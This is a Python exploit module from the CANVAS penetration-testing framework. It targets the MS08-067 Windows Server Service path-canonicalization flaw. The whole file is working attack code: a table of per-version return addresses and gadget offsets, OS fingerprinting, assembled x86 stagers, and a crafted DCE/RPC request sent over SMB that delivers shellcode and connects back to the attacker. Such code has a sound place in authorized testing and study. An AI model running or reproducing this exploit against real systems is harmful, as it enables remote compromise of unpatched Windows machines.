#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')
import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from msrpc import *
from MOSDEF import mosdef

# GUI info
NAME='Windows Server Service Underflow (MS08-067)'
DESCRIPTION='Windows Server Service CanonicalizePathName() Stack Underflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='10/23/2008'
DOCUMENTATION['CVE Name']='CVE-2008-4250'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250'
DOCUMENTATION['CVS URL']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS08-067.mspx'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['Notes']='If you need some localized version of Windows XP or 2003 added to the list, send support@immunityinc.com a msvcrt.dll of this version!'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']
PROPERTY['MSADV']='MS08-067'

CHANGELOG="""
"""

NOTES="""
XP Arabic: 0x77ba0000
XP Hebrew: 0x77bb0000
"""

targets={
    0: ['Autoversioning',0x0,[],0x0],
    1: ['Windows NT 4.0 SP6a',0x0,[0x002b5028],0x474], #jmp esp @ sortkey.nls
    2: ['Windows 2000 SP0-SP4',0x0,[0x0018682f],0x494], #jmp esi @ unicode.nls
    3: ['Windows XP SP0-SP1a',0x0,[0x001a682f],0x494], #jmp esi @ unicode.nls
    4: ['Windows XP SP2-SP3 English',0x77c10000,[0x1a2f3,0x13d0b,0x21a98,0x1e77d,0x4f334,0xc1eb,0x36784,0x126dd],0x460],
    5: ['Windows XP SP2-SP3 French,German,Simplified+Chinese',0x77be0000,[0x1a2f3,0x13d0b,0x21a98,0x1e77d,0x4f334,0xc1eb,0x36784,0x126dd],0x460],
    6: ['Windows 2003 SP0',0x0,[0x001a682f],0x498],
    7: ['Windows 2003 SP1-SP2 English',0x77ba0000,[0x1ae84,0x14837,0x229d1,0x1f59e,0x51354,0xc637,0x375f4,0x1320a],0x460],
}

from msrpcexploit import msrpcexploit 
from libs.dcemarshall import *

class theexploit(msrpcexploit):

    def __init__(self):
        msrpcexploit.__init__(self)
        self.name=NAME
        self.version=0
        self.badstring='\0\xff'
        self.searchbadstring='\0'
        self.UUID='4b324fc8-1670-01d3-1278-5a47bf6ee188'
        self.uuidversion='3.0'
        self.targetfunction=0x1f
        self.autoversion=1
        self.subesp=1000
        self.sleeptime=4
        self.port=445
        self.namedpipe='\\browser'
        self.buildConnectionList=self.buildTCPConnectionList
        self.setSubVersions() #automatically sets some variables for some common versions/languages
        return

    def setSubVersions(self):
        self.deptargets=[]
        self.langdictXP={}
        self.langdict2003={}
        for v in targets:
            d=targets[v]
            if d[0].count('XP SP2')>0:
                self.deptargets.append(v)
                l=d[0].split(' ')[-1]
                for s in l.split(','):
                    s=s.replace('+',' ')
                    self.langdictXP[s]=v
            elif d[0].count('2003 SP1')>0:
                self.deptargets.append(v)
                l=d[0].split(' ')[-1]
                for s in l.split(','):
                    self.langdict2003[s]=v
            elif d[0].count('2000')>0:
                self.WIN2000=v
            elif d[0].count('XP SP0')>0:
                self.WINXP=v
            elif d[0].count('2003 SP0')>0:
                self.WIN2003=v
            elif d[0].count('NT 4.0')>0:
                self.WINNT4=v
        return

    def testOS(self):
        if self.version!=0:
            self.log('TestOS running with version %d?!?'%self.version)            
        self.version=0
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)

        if app.run()==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        myos=app.result
        self.log('OS Found: %s'%(myos))
        if not myos.language:
            self.log('No language found, defaulting to engine\'s non-language option %s'%(self.engine.osdetect_mode))
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NO_RUN:
                self.log('Not running, could not find language')
                return 0
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_ONE_LANG:
                self.log('Assuming language %s'%(self.engine.osdetect_lang))
                myos.language=self.engine.osdetect_lang
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NEAREST_NEIGHBOR:
                self.log('Nearest neighbor algorithm not yet implemented')
                return 0
        if myos.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        if myos.version=='NT':
            self.version=self.WINNT4
            return 1
        elif myos.version=='2000':
            self.version=self.WIN2000
            return 1
        elif myos.version=='XP':
            if 'SP0' in myos.servicepack or 'SP1' in myos.servicepack:
                self.version=self.WINXP
            else:
                self.log('Attacking Windows XP SP2-SP3 language: %s'%(myos.language))
                if myos.language in self.langdictXP.keys():
                    self.version=self.langdictXP[myos.language]
                    return 1
                else:
                    return 0
        elif myos.version=='2003':
            if 'SP0' in myos.servicepack:
                self.version=self.WIN2003
            else:
                self.log('Attacking Windows 2003 SP1-SP2 language: %s'%(myos.language))
                if myos.language in self.langdict2003.keys():
                    self.version=self.langdict2003[myos.language]
                    return 1
                else:
                    return 0
            return 1
        else:
            self.log('OS not vulnerable: %s'%(myos))
        return 0
    
    def buildDcePacket(self):
        self.log('Using version %d'%(self.version))
        self.info,self.base,self.eip,self.distance=targets[self.version]
        self.log('Attacking %s'%(self.info))
        data=''
        payload=''
        for c in 'A\\..\\..\\':
            payload+=c+'\0'
        mark=len(payload)

        if self.version==self.WINNT4: #Windows NT 4.0
            stager2k="""movl %%esp,%%eax
addw $0x%x,%%ax
movl (%%eax),%%eax
jmp %%eax"""%(self.distance)
            stager=mosdef.assemble(stager2k,'x86')
            payload+=struct.pack('<L',self.eip[0])
            payload+='BBBB'
            payload+=stager
            payload+='C'*(0x4a-(len(payload)-mark))

        elif self.version==self.WIN2000 or self.version==self.WINXP: #Windows 2000 or Windows XP SP0-SP1a
            stager2k="""movl %%esp,%%eax
addw $0x%x,%%ax
movl (%%eax),%%eax
jmp %%eax"""%(self.distance)
            stager=mosdef.assemble(stager2k,'x86')
            payload+='A'*0x12
            payload+=struct.pack('<L',self.eip[0])
            payload+=stager
            payload+='C'*(0x48-(len(payload)-mark))
            payload+='\xeb\xcc'

        elif self.version==self.WIN2003: #Windows 2003 SP0
            stager2k="""movl %%esp,%%eax
addw $0x%x,%%ax
movl (%%eax),%%eax
jmp %%eax"""%(self.distance)
            stager=mosdef.assemble(stager2k,'x86')
            payload+='AA'
            payload+=struct.pack('<L',self.eip[0])
            payload+='C'*0x32
            payload+=stager
            payload+='D'*(0x4a-(len(payload)-mark))
            
        elif self.version in self.deptargets: #Windows XP SP2-SP3, or Windows 2003 SP1-SP2
            for i in range(len(self.eip)):
                self.eip[i]+=self.base
            stagerXp="""movl %%esp,%%eax
addw $0x%x,%%ax
movl 0x0(%%eax),%%eax
pushl %%eax
call %%esi
jmp %%eax"""%(self.distance) #__wcsdup
            stager=mosdef.assemble(stagerXp,'x86')
            if len(stager)>0x0e:
                raise Exception,'Somebody messed up something in MOSDEF, cannot continue' #HI DAVE!!!
            #This is based on a Nicolas P. idea
            payload+=struct.pack('<L',self.eip[7]) #call eax
            payload+=stager
            payload+='B'*(0x12-(len(payload)-mark))
            payload+=struct.pack('<LLLL',self.eip[0],0xffffffff,0x00010001,0x00010001) #HeapCreate
            payload+='C'*4 #discarded
            payload+=struct.pack('<LL',self.eip[1],0xfffffff5)
            payload+=struct.pack('<L',self.eip[2])
            payload+=struct.pack('<L',self.eip[6]) #__wcsdup
            payload+='D'*4 #discarded
            payload+=struct.pack('<L',self.eip[3])
            payload+=struct.pack('<L',self.eip[4])
            payload+=struct.pack('<L',self.eip[5])
            payload+=struct.pack('<L',self.eip[6]+5) #__wcsdup+5

        payload+='\0\0'
        data+=struct.pack('<L',0x00000001)
        data+=s_dce_raw_unistring(self.shellcode+'A'*64+'\0\0')
        data+=s_dce_raw_unistring(payload)
        data+=struct.pack('<L',0x00000002)
        data+=s_dce_win2k_unistring('\\')
        data+=struct.pack('<LL',1,1)
        return data

    def usage(self):
        print 'Usage: %s -v version -t host -l localIP -d localPort (connectback) [ -p port -T (toggle test mode) ]'% sys.argv[0]
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'% (i,listline[0].replace('+',' '))
            i=i+1
        sys.exit(0)
    
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
    elif ret not in [0,1,None]:
        print 'Weird return value: %s'%(ret)
